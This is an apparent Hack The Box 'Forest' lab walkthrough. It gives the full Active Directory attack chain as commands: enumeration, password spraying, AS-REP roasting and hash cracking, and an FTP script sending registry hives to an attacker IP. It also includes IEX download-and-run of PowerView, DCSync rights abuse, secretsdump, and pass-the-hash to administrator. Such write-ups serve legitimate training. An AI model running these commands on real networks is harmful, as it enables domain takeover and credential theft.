# Forest Hack The Box Tips

# ${{\color{purple}Initial Recon}}\ $

### NMAP RECON :

``nmap -sC -sV -oA forest 10.10.10.161``

``sleep300; nmap -p- -oA fullforst 10.10.10.161``

### SMB RECON :

``smbclient -L 10.10.10.161``

### LDAP RECON :

``ldapsearch -h 10.10.10.161 -x``

``ldapsearch -H ldap://10.10.10.161 -x -s base namingcontexts``

``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" > ldap-anonymous.out``

``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i samaccountname``

``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i userPrincipalName``

``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' | grep -i pwdLastSet``

``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=Person)' samaccountname userPrincipalName pwdLastSet``

> google pwdLastSet ldap to human

https://www.epochconverter.com/ldap # Allows to transform data and to know if the accounts are valid 

### Transform commandes into a clean list of users and mails:

``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' sAMAccountName | grep sAMAccountName | awk '{print $2}' > userlist.ldap`` 

``ldapsearch -H ldap://10.10.10.161 -x -b "DC=htb,DC=local" '(objectClass=User)' userPrincipalName | grep userPrincipalName | awk '{print $2}' > listmail.ldap``

### RPC RECON :

``rpcclient -U '' -N 10.10.10.161``

``enumdomusers``

``queryusergroups 0x47b``

``querygroup 0x47c``

``queryuser svc-alfresco``

![foret1](https://user-images.githubusercontent.com/123066149/219473940-1d997e3f-02fc-43da-b23a-1b1caf983c85.PNG)

![foret2](https://user-images.githubusercontent.com/123066149/219474000-d7af10d8-b7c2-4ca7-9a8e-fd5ee81e850b.PNG)

### AD passwords policy with CME (crackmapexec) :

``crackmapexec smb 10.10.10.161 --pass-pol -u '' -p ''``

``crackmapexec smb 10.10.10.161 --pass-pol -u 'user.lst' -p 'passwd.lst'``

### Password spray with crackmapexec

``crackmapexec smb 10.10.10.161 -u 'user.lst' -p 'passwd.lst'``

### Which makes it possible to advance on this box

``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/``       :white_check_mark:

![foret3](https://user-images.githubusercontent.com/123066149/219474106-21ca5839-47c6-490d-a634-04ffff9ea1ae.PNG)


``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/ -format hashcat``

![foret4](https://user-images.githubusercontent.com/123066149/219474172-104cc2cc-402f-4c70-875d-de718e5343cf.PNG)


``hashcat --example-hashes | grep -i krb``

``hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt`` # ippsec add -r rules/InsidePro-PasswordsPro.rule try to understand why

![foret5](https://user-images.githubusercontent.com/123066149/219474212-b889f930-8baa-4792-8ca8-2dca650ce1f5.PNG)


# ${{\color{purple}Initial Foothold}}\ $

### Test with a valid user :
 
``crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'``

``crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares``

# ${{\color{purple}Exploitation}}\ $

### port 5985 is important it is Win-RM (powershell remoting)

``locate evil-winrm``

``/usr/bin/evil-winrm -u svc-alfresco -p s3rvice -i 10.10.10.161``

![foret6](https://user-images.githubusercontent.com/123066149/219474485-14552105-e748-4666-b91c-bf4ffa8ebbd0.PNG)


# ${{\color{purple}Privilege Escalation}}\ $

### File transfer with FTP:

``find . | grep exe$``

``impacket-smbserver idk $(pwd) -smb2support -user user -password idkazewxc123``

![foret7](https://user-images.githubusercontent.com/123066149/219474532-29bb4e52-4708-4b0f-a113-c9208183c429.PNG)


``$pass = convertto-securestring 'idkazewxc123' -AsPlainText -Force``

``$cred = New-Object System.Management.Automation.PSCredential('HTB\ippsec', $pass)``

``New-PSDrive -PSProvider FileSystem \\10.10.16.5``


``systemctl restart pure-ftpd``

``echo 'open 10.10.16.5 21'> ftp.txt``

``echo 'USER offsec'>> ftp.txt``

``echo 'lab'>> ftp.txt``

``echo 'bin'>> ftp.txt``

``echo 'PUT C:\windows\system32\config\SYSTEM'>> ftp.txt``

``echo 'PUT C:\windows\system32\config\SAM'>> ftp.txt``

``echo 'PUT C:\windows\system32\config\SECURITY'>> ftp.txt``

``echo 'bye'>> ftp.txt``



``ftp –v –n –s:ftp.txt``

``systemctl stop pure-ftpd``

### File transfer with SMB :

``New-PSDrive -Name ippsec4 -PSProvider FileSystem -Root \\10.10.16.5\test``

``cd ippsec4:``

``/usr/share/doc/python3-impacket/examples/smbserver.py test /mnt/share -smb2support``

### Bloodhound :

### if there is an installation of bloodhound and I don't remember the password neo4j delet :

``rm /usr/share/neo4j/data/dbms/auth``

``neo4j console``

``neo4j password : sparta-castro-union-labor-pluto-9066``


``./BloodHound --no-sandbox``

``.\SharpHound.exe -c all``

![foret8](https://user-images.githubusercontent.com/123066149/219474603-46922d67-0cc6-4e78-a08f-7ae8974f63fc.PNG)

### Bloodhound search :

``-Mark User as Owned``
``-Search for Shortest Path from Owned Principals``

``net user evil evil123 /add /domain``

``net group "Exchange Windows Permissions"``

``net group "Exchange Windows Permissions" /add evil``

### File transfer with SMB :

``IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:8080/PowerView.ps1')``

``$pass = convertto-securestring 'evil123' -AsPlainText -Force``

``$cred = New-Object System.Management.Automation.PSCredential('HTB\evil', $pass)``

``Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity evil -Rights DCSync``

``/usr/bin/impacket-secretsdump htb.local/evil:evil123@10.10.10.161``

``crackmapexec smb 10.10.10.161 -u 'administrator' -H 32693b11e6aa90eb43d32c72a07ceea6``

``/usr/bin/impacket-psexec -hashes 32693b11e6aa90eb43d32c72a07ceea6:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161``

# ${{\color{purple}Points of Improvement}}\ $

- Don't forget / in impacket :

``/usr/bin/impacket-GetNPUsers -dc-ip 10.10.10.161 -request htb.local/``
